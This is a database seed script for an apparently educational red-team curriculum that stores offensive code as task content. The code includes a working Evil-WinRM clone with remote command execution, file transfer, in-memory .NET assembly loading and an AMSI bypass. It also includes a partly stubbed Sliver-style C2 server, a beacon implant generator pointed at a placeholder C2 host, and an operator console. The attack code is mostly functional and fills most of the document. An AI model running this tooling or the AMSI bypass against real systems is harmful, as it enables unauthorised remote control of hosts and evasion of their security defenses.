import Database from 'better-sqlite3';

const sqlite = new Database('data/quest-log.db');

const insertPath = sqlite.prepare(
	'INSERT INTO paths (name, description, color, language, difficulty, estimated_weeks, skills, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)'
);
const insertModule = sqlite.prepare(
	'INSERT INTO modules (path_id, name, description, order_index, created_at) VALUES (?, ?, ?, ?, ?)'
);
const insertTask = sqlite.prepare(
	'INSERT INTO tasks (module_id, title, description, details, order_index, created_at) VALUES (?, ?, ?, ?, ?, ?)'
);

const now = Date.now();

// ============================================================================
// EVIL-WINRM & ADVANCED C2 FRAMEWORKS
// ============================================================================
const c2Path = insertPath.run(
	'Reimplement: Evil-WinRM & C2 Frameworks',
	'Build Evil-WinRM clone and Sliver/Covenant-style C2 frameworks from scratch. Master remote management and implant development.',
	'purple',
	'Go+Rust+Python',
	'advanced',
	14,
	'WinRM, PowerShell remoting, gRPC, implant development, operator interface, OPSEC',
	now
);

// Module 1: Evil-WinRM
const c2Mod1 = insertModule.run(c2Path.lastInsertRowid, 'Build Evil-WinRM Clone', 'WinRM shell with offensive features', 0, now);

insertTask.run(c2Mod1.lastInsertRowid, 'Implement WinRM Protocol Client', 'Build a WinRM client implementing the WS-Management protocol over HTTP/S with NTLM and Kerberos authentication, SOAP envelope construction, PowerShell remoting support, and file transfer capabilities', `## Evil-WinRM Implementation

### WinRM Protocol Client
\`\`\`python
#!/usr/bin/env python3
"""
evil_winrm_clone.py - WinRM Shell with Offensive Features
Replicates: Evil-WinRM functionality
"""

import base64
import ssl
import http.client
import xml.etree.ElementTree as ET
from typing import Optional, Tuple
import uuid
import readline
import os

class WinRMClient:
    """Windows Remote Management (WS-Management) client"""

    SOAP_NS = {
        's': 'http://www.w3.org/2003/05/soap-envelope',
        'a': 'http://schemas.xmlsoap.org/ws/2004/08/addressing',
        'w': 'http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd',
        'p': 'http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd',
        'rsp': 'http://schemas.microsoft.com/wbem/wsman/1/windows/shell',
    }

    def __init__(self, host: str, port: int = 5985, ssl: bool = False):
        self.host = host
        self.port = port
        self.use_ssl = ssl
        self.auth_header = None
        self.shell_id = None
        self.command_id = None

    def connect(self, username: str, password: str, domain: str = '') -> bool:
        """Establish connection with authentication"""
        # Build auth header (Basic or NTLM)
        if domain:
            user = f"{domain}\\\\{username}"
        else:
            user = username

        creds = base64.b64encode(f"{user}:{password}".encode()).decode()
        self.auth_header = f"Basic {creds}"

        # Test connection
        try:
            response = self._send_request(self._build_identify())
            return b'ProductVersion' in response
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False

    def create_shell(self) -> bool:
        """Create remote shell"""
        request = self._build_shell_create()
        response = self._send_request(request)

        # Parse shell ID from response
        root = ET.fromstring(response)
        shell_elem = root.find('.//rsp:ShellId', self.SOAP_NS)
        if shell_elem is not None:
            self.shell_id = shell_elem.text
            return True
        return False

    def execute_command(self, command: str) -> Tuple[str, str, int]:
        """Execute command and return (stdout, stderr, exit_code)"""
        if not self.shell_id:
            return '', 'No shell', -1

        # Send command
        request = self._build_command(command)
        response = self._send_request(request)

        # Get command ID
        root = ET.fromstring(response)
        cmd_elem = root.find('.//rsp:CommandId', self.SOAP_NS)
        if cmd_elem is None:
            return '', 'Failed to create command', -1

        self.command_id = cmd_elem.text

        # Receive output
        stdout = ''
        stderr = ''
        exit_code = 0

        while True:
            request = self._build_receive()
            response = self._send_request(request)
            root = ET.fromstring(response)

            # Get stdout
            for stream in root.findall('.//rsp:Stream[@Name="stdout"]', self.SOAP_NS):
                if stream.text:
                    stdout += base64.b64decode(stream.text).decode('utf-8', errors='ignore')

            # Get stderr
            for stream in root.findall('.//rsp:Stream[@Name="stderr"]', self.SOAP_NS):
                if stream.text:
                    stderr += base64.b64decode(stream.text).decode('utf-8', errors='ignore')

            # Check if command completed
            state = root.find('.//rsp:CommandState', self.SOAP_NS)
            if state is not None and 'Done' in state.get('State', ''):
                exit_elem = root.find('.//rsp:ExitCode', self.SOAP_NS)
                if exit_elem is not None:
                    exit_code = int(exit_elem.text)
                break

        # Signal command completion
        self._send_request(self._build_signal())

        return stdout, stderr, exit_code

    def upload_file(self, local_path: str, remote_path: str) -> bool:
        """Upload file to target"""
        with open(local_path, 'rb') as f:
            content = base64.b64encode(f.read()).decode()

        # PowerShell to decode and write file
        ps_cmd = f'''
        $d = [System.Convert]::FromBase64String("{content}")
        [System.IO.File]::WriteAllBytes("{remote_path}", $d)
        '''

        stdout, stderr, code = self.execute_command(f'powershell -enc {base64.b64encode(ps_cmd.encode("utf-16-le")).decode()}')
        return code == 0

    def download_file(self, remote_path: str, local_path: str) -> bool:
        """Download file from target"""
        ps_cmd = f'[Convert]::ToBase64String([IO.File]::ReadAllBytes("{remote_path}"))'
        stdout, stderr, code = self.execute_command(f'powershell -c "{ps_cmd}"')

        if code == 0 and stdout.strip():
            with open(local_path, 'wb') as f:
                f.write(base64.b64decode(stdout.strip()))
            return True
        return False

    def _send_request(self, body: str) -> bytes:
        """Send SOAP request"""
        if self.use_ssl:
            conn = http.client.HTTPSConnection(
                self.host, self.port,
                context=ssl._create_unverified_context()
            )
        else:
            conn = http.client.HTTPConnection(self.host, self.port)

        headers = {
            'Content-Type': 'application/soap+xml;charset=UTF-8',
            'Authorization': self.auth_header,
        }

        conn.request('POST', '/wsman', body.encode(), headers)
        response = conn.getresponse()
        data = response.read()
        conn.close()

        if response.status != 200:
            raise Exception(f"HTTP {response.status}: {data.decode()}")

        return data

    def _build_identify(self) -> str:
        """Build Identify request"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
            xmlns:wsmid="http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd">
  <s:Header/>
  <s:Body>
    <wsmid:Identify/>
  </s:Body>
</s:Envelope>'''

    def _build_shell_create(self) -> str:
        """Build shell creation request"""
        msg_id = str(uuid.uuid4())
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
            xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
            xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
            xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"
            xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">
  <s:Header>
    <a:To>http://{self.host}:{self.port}/wsman</a:To>
    <a:ReplyTo><a:Address>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address></a:ReplyTo>
    <a:Action>http://schemas.xmlsoap.org/ws/2004/09/transfer/Create</a:Action>
    <a:MessageID>uuid:{msg_id}</a:MessageID>
    <w:ResourceURI>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>
    <w:OperationTimeout>PT60S</w:OperationTimeout>
  </s:Header>
  <s:Body>
    <rsp:Shell>
      <rsp:InputStreams>stdin</rsp:InputStreams>
      <rsp:OutputStreams>stdout stderr</rsp:OutputStreams>
    </rsp:Shell>
  </s:Body>
</s:Envelope>'''

    def _build_command(self, command: str) -> str:
        """Build command execution request"""
        msg_id = str(uuid.uuid4())
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
            xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
            xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
            xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">
  <s:Header>
    <a:To>http://{self.host}:{self.port}/wsman</a:To>
    <a:Action>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command</a:Action>
    <a:MessageID>uuid:{msg_id}</a:MessageID>
    <w:ResourceURI>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>
    <w:SelectorSet><w:Selector Name="ShellId">{self.shell_id}</w:Selector></w:SelectorSet>
  </s:Header>
  <s:Body>
    <rsp:CommandLine>
      <rsp:Command>cmd.exe /c {command}</rsp:Command>
    </rsp:CommandLine>
  </s:Body>
</s:Envelope>'''

    def _build_receive(self) -> str:
        """Build output receive request"""
        msg_id = str(uuid.uuid4())
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
            xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
            xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
            xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">
  <s:Header>
    <a:To>http://{self.host}:{self.port}/wsman</a:To>
    <a:Action>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive</a:Action>
    <a:MessageID>uuid:{msg_id}</a:MessageID>
    <w:ResourceURI>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>
    <w:SelectorSet><w:Selector Name="ShellId">{self.shell_id}</w:Selector></w:SelectorSet>
  </s:Header>
  <s:Body>
    <rsp:Receive>
      <rsp:DesiredStream CommandId="{self.command_id}">stdout stderr</rsp:DesiredStream>
    </rsp:Receive>
  </s:Body>
</s:Envelope>'''

    def _build_signal(self) -> str:
        """Build signal (terminate) request"""
        msg_id = str(uuid.uuid4())
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
            xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
            xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
            xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">
  <s:Header>
    <a:To>http://{self.host}:{self.port}/wsman</a:To>
    <a:Action>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Signal</a:Action>
    <a:MessageID>uuid:{msg_id}</a:MessageID>
    <w:ResourceURI>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>
    <w:SelectorSet><w:Selector Name="ShellId">{self.shell_id}</w:Selector></w:SelectorSet>
  </s:Header>
  <s:Body>
    <rsp:Signal CommandId="{self.command_id}">
      <rsp:Code>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/signal/terminate</rsp:Code>
    </rsp:Signal>
  </s:Body>
</s:Envelope>'''


class EvilWinRM:
    """Evil-WinRM style shell with offensive features"""

    def __init__(self, client: WinRMClient):
        self.client = client
        self.ps_modules_path = './ps_modules'

    def run_shell(self):
        """Interactive shell"""
        print("\\n[+] Connected! Type 'help' for commands\\n")

        while True:
            try:
                cmd = input("*Evil-WinRM* PS> ").strip()

                if not cmd:
                    continue
                elif cmd == 'exit':
                    break
                elif cmd == 'help':
                    self._print_help()
                elif cmd.startswith('upload '):
                    self._upload(cmd[7:])
                elif cmd.startswith('download '):
                    self._download(cmd[9:])
                elif cmd.startswith('menu'):
                    self._show_menu()
                elif cmd.startswith('Bypass-4MSI'):
                    self._amsi_bypass()
                elif cmd.startswith('Invoke-Binary '):
                    self._invoke_binary(cmd[14:])
                elif cmd.startswith('services'):
                    self._enum_services()
                else:
                    # Execute as PowerShell
                    stdout, stderr, code = self.client.execute_command(f'powershell.exe -c "{cmd}"')
                    if stdout:
                        print(stdout)
                    if stderr:
                        print(f"\\033[91m{stderr}\\033[0m")

            except KeyboardInterrupt:
                print()
                continue
            except EOFError:
                break

    def _print_help(self):
        print("""
Evil-WinRM Clone Commands:
  upload <local> <remote>   - Upload file
  download <remote> <local> - Download file
  menu                      - Show loaded functions
  Bypass-4MSI              - AMSI bypass
  Invoke-Binary <path>     - Load and execute .NET assembly
  services                 - Enumerate services
  exit                     - Exit shell
        """)

    def _upload(self, args: str):
        parts = args.split()
        if len(parts) >= 2:
            if self.client.upload_file(parts[0], parts[1]):
                print(f"[+] Uploaded to {parts[1]}")
            else:
                print("[-] Upload failed")

    def _download(self, args: str):
        parts = args.split()
        if len(parts) >= 2:
            if self.client.download_file(parts[0], parts[1]):
                print(f"[+] Downloaded to {parts[1]}")
            else:
                print("[-] Download failed")

    def _amsi_bypass(self):
        bypass = '''
        $a = [Ref].Assembly.GetTypes() | % { if ($_.Name -like "*siUtils") { $_ } }
        $b = $a.GetFields('NonPublic,Static') | % { if ($_.Name -like "*siContext") { $_ } }
        $b.SetValue($null, [IntPtr]::Zero)
        '''
        self.client.execute_command(f'powershell -enc {base64.b64encode(bypass.encode("utf-16-le")).decode()}')
        print("[+] AMSI bypass attempted")

    def _invoke_binary(self, path: str):
        """Load .NET assembly in memory"""
        ps_cmd = f'''
        $data = [IO.File]::ReadAllBytes("{path}")
        $asm = [Reflection.Assembly]::Load($data)
        $asm.EntryPoint.Invoke($null, @(,[string[]]@()))
        '''
        stdout, stderr, _ = self.client.execute_command(f'powershell -c "{ps_cmd}"')
        print(stdout)

    def _enum_services(self):
        stdout, _, _ = self.client.execute_command('powershell Get-Service | Select Name,Status')
        print(stdout)

    def _show_menu(self):
        # Load PowerShell scripts from modules directory
        if os.path.exists(self.ps_modules_path):
            for f in os.listdir(self.ps_modules_path):
                if f.endswith('.ps1'):
                    print(f"  {f[:-4]}")


def main():
    import argparse
    parser = argparse.ArgumentParser(description='Evil-WinRM Clone')
    parser.add_argument('-i', '--ip', required=True, help='Target IP')
    parser.add_argument('-u', '--user', required=True, help='Username')
    parser.add_argument('-p', '--password', required=True, help='Password')
    parser.add_argument('-P', '--port', type=int, default=5985, help='Port')
    parser.add_argument('-S', '--ssl', action='store_true', help='Use SSL')
    args = parser.parse_args()

    print("""
    ___________      .__.__   __      __.__       __________   _____
    \\_   _____/__  __|__|  | /  \\    /  \\__| ____ \\______   \\ /     \\
     |    __)_\\  \\/ /  |  | \\   \\/\\/   /  |/    \\ |       _//  \\ /  \\
     |        \\\\   /|  |  |__\\        /|  |   |  \\|    |   \\    Y    \\
    /_______  / \\_/ |__|____/ \\__/\\  / |__|___|  /|____|_  /\\____|__  /
            \\/                     \\/          \\/        \\/         \\/
                                                              Clone
    """)

    client = WinRMClient(args.ip, args.port, args.ssl)

    print(f"[*] Connecting to {args.ip}:{args.port}")
    if client.connect(args.user, args.password):
        print("[+] Authentication successful")

        if client.create_shell():
            print("[+] Shell created")
            shell = EvilWinRM(client)
            shell.run_shell()
        else:
            print("[-] Failed to create shell")
    else:
        print("[-] Authentication failed")


if __name__ == '__main__':
    main()
\`\`\``, 0, now);

// Module 2: Sliver-Style C2
const c2Mod2 = insertModule.run(c2Path.lastInsertRowid, 'Build Sliver-Style C2 Framework', 'Modern C2 with gRPC and implant generation', 1, now);

insertTask.run(c2Mod2.lastInsertRowid, 'Build C2 Server with gRPC', 'Develop a C2 server using gRPC for operator-to-server communication, with multi-operator support, implant session management, task queuing, real-time event streaming, and persistent database storage', `## Sliver-Style C2 Server

### Server Architecture (Go)
\`\`\`go
// server/main.go
package main

import (
    "context"
    "crypto/tls"
    "crypto/x509"
    "fmt"
    "log"
    "net"
    "sync"
    "time"

    "google.golang.org/grpc"
    "google.golang.org/grpc/credentials"
)

// Implant represents a connected agent
type Implant struct {
    ID        string
    Name      string
    Hostname  string
    Username  string
    OS        string
    Arch      string
    PID       int
    Transport string
    RemoteAddr string
    LastSeen  time.Time
    Tasks     chan *Task
}

// Task represents a pending command
type Task struct {
    ID      string
    Type    string
    Data    []byte
    Result  chan *TaskResult
}

// TaskResult is the result from an implant
type TaskResult struct {
    TaskID  string
    Success bool
    Data    []byte
    Error   string
}

// C2Server manages implants and operators
type C2Server struct {
    implants    map[string]*Implant
    operators   map[string]*Operator
    mu          sync.RWMutex
    eventChan   chan *Event
}

// Operator represents a connected operator
type Operator struct {
    ID   string
    Name string
    Conn interface{}
}

// Event for operator notifications
type Event struct {
    Type    string // "implant_connected", "implant_disconnected", "task_complete"
    Data    interface{}
}

func NewC2Server() *C2Server {
    return &C2Server{
        implants:  make(map[string]*Implant),
        operators: make(map[string]*Operator),
        eventChan: make(chan *Event, 100),
    }
}

// RegisterImplant adds new implant
func (s *C2Server) RegisterImplant(implant *Implant) {
    s.mu.Lock()
    s.implants[implant.ID] = implant
    s.mu.Unlock()

    log.Printf("[+] Implant registered: %s (%s@%s)", implant.ID, implant.Username, implant.Hostname)

    s.eventChan <- &Event{Type: "implant_connected", Data: implant}
}

// GetImplants returns all implants
func (s *C2Server) GetImplants() []*Implant {
    s.mu.RLock()
    defer s.mu.RUnlock()

    implants := make([]*Implant, 0, len(s.implants))
    for _, imp := range s.implants {
        implants = append(implants, imp)
    }
    return implants
}

// TaskImplant sends task to implant
func (s *C2Server) TaskImplant(implantID string, task *Task) (*TaskResult, error) {
    s.mu.RLock()
    implant, exists := s.implants[implantID]
    s.mu.RUnlock()

    if !exists {
        return nil, fmt.Errorf("implant not found")
    }

    task.Result = make(chan *TaskResult, 1)
    implant.Tasks <- task

    // Wait for result with timeout
    select {
    case result := <-task.Result:
        return result, nil
    case <-time.After(5 * time.Minute):
        return nil, fmt.Errorf("timeout")
    }
}

// HTTP/S Listener
type HTTPListener struct {
    server   *C2Server
    addr     string
    certFile string
    keyFile  string
}

func (l *HTTPListener) Start() error {
    // Start HTTP/S listener for implant callbacks
    // Handle implant registration, beacons, task responses
    return nil
}

// mTLS Listener
type MTLSListener struct {
    server   *C2Server
    addr     string
    caPool   *x509.CertPool
}

func (l *MTLSListener) Start() error {
    // Mutual TLS for secure implant communication
    config := &tls.Config{
        ClientAuth: tls.RequireAndVerifyClientCert,
        ClientCAs:  l.caPool,
    }

    listener, err := tls.Listen("tcp", l.addr, config)
    if err != nil {
        return err
    }

    for {
        conn, err := listener.Accept()
        if err != nil {
            continue
        }
        go l.handleConnection(conn)
    }
}

func (l *MTLSListener) handleConnection(conn net.Conn) {
    // Handle mTLS implant connection
}

// gRPC Operator Service
type OperatorService struct {
    server *C2Server
}

func (s *OperatorService) GetImplants(ctx context.Context, req *Empty) (*ImplantList, error) {
    // Return list of implants
    return nil, nil
}

func (s *OperatorService) TaskImplant(ctx context.Context, req *TaskRequest) (*TaskResponse, error) {
    // Send task to implant
    return nil, nil
}

func (s *OperatorService) GenerateImplant(ctx context.Context, req *GenerateRequest) (*GenerateResponse, error) {
    // Generate new implant binary
    return nil, nil
}

func main() {
    server := NewC2Server()

    // Start listeners
    go func() {
        http := &HTTPListener{server: server, addr: ":443"}
        http.Start()
    }()

    // Start gRPC for operators
    lis, err := net.Listen("tcp", ":50051")
    if err != nil {
        log.Fatalf("failed to listen: %v", err)
    }

    grpcServer := grpc.NewServer()
    // Register services...

    log.Println("[*] C2 Server started")
    log.Println("[*] HTTP/S listener on :443")
    log.Println("[*] gRPC operator service on :50051")

    grpcServer.Serve(lis)
}

// Placeholder types for gRPC
type Empty struct{}
type ImplantList struct{}
type TaskRequest struct{}
type TaskResponse struct{}
type GenerateRequest struct{}
type GenerateResponse struct{}
\`\`\``, 0, now);

insertTask.run(c2Mod2.lastInsertRowid, 'Build Cross-Platform Implant Generator', 'Create a build system that compiles implants for Windows, Linux, and macOS with configurable C2 endpoints, obfuscation options, embedded configuration, and output formats including executables, DLLs, and shellcode', `## Implant Generator

### Generator (Go)
\`\`\`go
// generator/main.go
package main

import (
    "bytes"
    "crypto/rand"
    "encoding/hex"
    "fmt"
    "os"
    "os/exec"
    "path/filepath"
    "text/template"
)

type ImplantConfig struct {
    // Connection
    C2Servers   []string
    Protocols   []string  // http, https, mtls, dns
    CallbackURL string

    // Timing
    BeaconInterval int
    Jitter         int

    // Security
    EncryptionKey []byte
    ObfuscateStrings bool

    // Build
    GOOS   string
    GOARCH string
    Debug  bool
}

type ImplantGenerator struct {
    templateDir string
    outputDir   string
}

func NewImplantGenerator() *ImplantGenerator {
    return &ImplantGenerator{
        templateDir: "./implant_templates",
        outputDir:   "./generated",
    }
}

func (g *ImplantGenerator) Generate(config *ImplantConfig) (string, error) {
    // Generate unique implant ID
    idBytes := make([]byte, 8)
    rand.Read(idBytes)
    implantID := hex.EncodeToString(idBytes)

    // Generate encryption key if not provided
    if len(config.EncryptionKey) == 0 {
        config.EncryptionKey = make([]byte, 32)
        rand.Read(config.EncryptionKey)
    }

    // Create temp directory for build
    buildDir := filepath.Join(g.outputDir, implantID)
    os.MkdirAll(buildDir, 0755)

    // Generate source code from templates
    if err := g.generateSource(buildDir, config); err != nil {
        return "", fmt.Errorf("generate source: %w", err)
    }

    // Compile
    outputName := fmt.Sprintf("implant_%s", implantID)
    if config.GOOS == "windows" {
        outputName += ".exe"
    }
    outputPath := filepath.Join(g.outputDir, outputName)

    if err := g.compile(buildDir, outputPath, config); err != nil {
        return "", fmt.Errorf("compile: %w", err)
    }

    // Cleanup build directory
    os.RemoveAll(buildDir)

    return outputPath, nil
}

func (g *ImplantGenerator) generateSource(buildDir string, config *ImplantConfig) error {
    // Main implant template
    mainTemplate := \`
package main

import (
    "bytes"
    "crypto/aes"
    "crypto/cipher"
    "encoding/base64"
    "encoding/json"
    "net/http"
    "os"
    "os/user"
    "runtime"
    "time"
)

var (
    c2Servers = []string{ {{range .C2Servers}}"{{.}}",{{end}} }
    beaconInterval = {{.BeaconInterval}}
    jitter = {{.Jitter}}
    encKey = []byte{ {{range .EncryptionKey}}{{.}},{{end}} }
)

type Registration struct {
    ID       string \\\`json:"id"\\\`
    Hostname string \\\`json:"hostname"\\\`
    Username string \\\`json:"username"\\\`
    OS       string \\\`json:"os"\\\`
    Arch     string \\\`json:"arch"\\\`
    PID      int    \\\`json:"pid"\\\`
}

type Task struct {
    ID   string \\\`json:"id"\\\`
    Type string \\\`json:"type"\\\`
    Data string \\\`json:"data"\\\`
}

func main() {
    reg := Registration{
        ID:       generateID(),
        Hostname: getHostname(),
        Username: getUsername(),
        OS:       runtime.GOOS,
        Arch:     runtime.GOARCH,
        PID:      os.Getpid(),
    }

    // Register with C2
    register(reg)

    // Beacon loop
    for {
        tasks := beacon(reg.ID)
        for _, task := range tasks {
            result := executeTask(task)
            sendResult(reg.ID, result)
        }

        sleep := time.Duration(beaconInterval) * time.Second
        // Add jitter
        time.Sleep(sleep)
    }
}

func register(reg Registration) { /* ... */ }
func beacon(id string) []Task { /* ... */ return nil }
func executeTask(task Task) interface{} { /* ... */ return nil }
func sendResult(id string, result interface{}) { /* ... */ }
func generateID() string { /* ... */ return "" }
func getHostname() string { h, _ := os.Hostname(); return h }
func getUsername() string { u, _ := user.Current(); return u.Username }
func encrypt(data []byte) []byte { /* ... */ return nil }
func decrypt(data []byte) []byte { /* ... */ return nil }
\`

    tmpl, err := template.New("main").Parse(mainTemplate)
    if err != nil {
        return err
    }

    f, err := os.Create(filepath.Join(buildDir, "main.go"))
    if err != nil {
        return err
    }
    defer f.Close()

    return tmpl.Execute(f, config)
}

func (g *ImplantGenerator) compile(buildDir, output string, config *ImplantConfig) error {
    args := []string{"build"}

    if !config.Debug {
        // Strip symbols and disable DWARF
        args = append(args, "-ldflags", "-s -w")
    }

    args = append(args, "-o", output, ".")

    cmd := exec.Command("go", args...)
    cmd.Dir = buildDir
    cmd.Env = append(os.Environ(),
        fmt.Sprintf("GOOS=%s", config.GOOS),
        fmt.Sprintf("GOARCH=%s", config.GOARCH),
        "CGO_ENABLED=0",
    )

    var stderr bytes.Buffer
    cmd.Stderr = &stderr

    if err := cmd.Run(); err != nil {
        return fmt.Errorf("%w: %s", err, stderr.String())
    }

    return nil
}

func main() {
    gen := NewImplantGenerator()

    config := &ImplantConfig{
        C2Servers:      []string{"https://c2.example.com"},
        BeaconInterval: 60,
        Jitter:         20,
        GOOS:           "windows",
        GOARCH:         "amd64",
    }

    output, err := gen.Generate(config)
    if err != nil {
        fmt.Printf("Error: %v\\n", err)
        return
    }

    fmt.Printf("[+] Generated implant: %s\\n", output)
}
\`\`\``, 1, now);

insertTask.run(c2Mod2.lastInsertRowid, 'Build Operator CLI Interface', 'Develop a command-line interface for red team operators to manage implants, execute tasks, view beacon callbacks, and interact with compromised hosts through session management and tabbed multi-agent workflows', `## Operator CLI

### Interactive Console (Go)
\`\`\`go
// operator/main.go
package main

import (
    "bufio"
    "context"
    "fmt"
    "os"
    "strings"

    "google.golang.org/grpc"
)

type OperatorCLI struct {
    conn         *grpc.ClientConn
    currentAgent string
}

func NewOperatorCLI(serverAddr string) (*OperatorCLI, error) {
    conn, err := grpc.Dial(serverAddr, grpc.WithInsecure())
    if err != nil {
        return nil, err
    }

    return &OperatorCLI{conn: conn}, nil
}

func (cli *OperatorCLI) Run() {
    cli.printBanner()

    reader := bufio.NewReader(os.Stdin)

    for {
        prompt := "sliver"
        if cli.currentAgent != "" {
            prompt = fmt.Sprintf("sliver (%s)", cli.currentAgent[:8])
        }

        fmt.Printf("%s > ", prompt)
        input, _ := reader.ReadString('\\n')
        input = strings.TrimSpace(input)

        if input == "" {
            continue
        }

        parts := strings.Fields(input)
        cmd := parts[0]
        args := parts[1:]

        switch cmd {
        case "help":
            cli.cmdHelp()
        case "implants", "sessions":
            cli.cmdImplants()
        case "use":
            cli.cmdUse(args)
        case "background":
            cli.currentAgent = ""
        case "info":
            cli.cmdInfo()
        case "shell":
            cli.cmdShell(args)
        case "execute":
            cli.cmdExecute(args)
        case "upload":
            cli.cmdUpload(args)
        case "download":
            cli.cmdDownload(args)
        case "ps":
            cli.cmdPs()
        case "netstat":
            cli.cmdNetstat()
        case "screenshot":
            cli.cmdScreenshot()
        case "generate":
            cli.cmdGenerate(args)
        case "listeners":
            cli.cmdListeners()
        case "jobs":
            cli.cmdJobs()
        case "exit":
            return
        default:
            fmt.Println("Unknown command. Type 'help' for available commands.")
        }
    }
}

func (cli *OperatorCLI) printBanner() {
    fmt.Println(\`
    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗
    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
                                        Clone
    \`)
}

func (cli *OperatorCLI) cmdHelp() {
    fmt.Println(\`
Commands:
  implants           List active implants
  use <id>           Interact with implant
  background         Background current session
  info               Show implant info

Session Commands:
  shell              Interactive shell
  execute <cmd>      Execute command
  upload <l> <r>     Upload file
  download <r> <l>   Download file
  ps                 List processes
  netstat            Network connections
  screenshot         Take screenshot

Server Commands:
  generate           Generate new implant
  listeners          List listeners
  jobs               Background jobs
  exit               Exit operator
\`)
}

func (cli *OperatorCLI) cmdImplants() {
    // gRPC call to get implants
    fmt.Println("\\n ID         Name           Transport    Remote Address     Hostname")
    fmt.Println(" ========== ============== ============ ================== ==================")
    // List implants from server
}

func (cli *OperatorCLI) cmdUse(args []string) {
    if len(args) < 1 {
        fmt.Println("Usage: use <implant-id>")
        return
    }
    cli.currentAgent = args[0]
    fmt.Printf("[*] Active session: %s\\n", args[0])
}

func (cli *OperatorCLI) cmdInfo() {
    if cli.currentAgent == "" {
        fmt.Println("[-] No active session")
        return
    }
    // Get implant info
}

func (cli *OperatorCLI) cmdShell(args []string) {
    if cli.currentAgent == "" {
        fmt.Println("[-] No active session")
        return
    }
    // Interactive shell
}

func (cli *OperatorCLI) cmdExecute(args []string) {
    if cli.currentAgent == "" {
        fmt.Println("[-] No active session")
        return
    }
    cmd := strings.Join(args, " ")
    // Execute command
    fmt.Printf("[*] Executing: %s\\n", cmd)
}

func (cli *OperatorCLI) cmdUpload(args []string)     { /* ... */ }
func (cli *OperatorCLI) cmdDownload(args []string)   { /* ... */ }
func (cli *OperatorCLI) cmdPs()                       { /* ... */ }
func (cli *OperatorCLI) cmdNetstat()                  { /* ... */ }
func (cli *OperatorCLI) cmdScreenshot()               { /* ... */ }
func (cli *OperatorCLI) cmdGenerate(args []string)    { /* ... */ }
func (cli *OperatorCLI) cmdListeners()                { /* ... */ }
func (cli *OperatorCLI) cmdJobs()                     { /* ... */ }

func main() {
    cli, err := NewOperatorCLI("localhost:50051")
    if err != nil {
        fmt.Printf("[-] Connection failed: %v\\n", err)
        return
    }
    cli.Run()
}
\`\`\``, 2, now);

console.log('Seeded: Evil-WinRM & C2 Frameworks');
console.log('  - Evil-WinRM complete clone');
console.log('  - Sliver-style C2 server');
console.log('  - Implant generator');
console.log('  - Operator CLI');

sqlite.close();
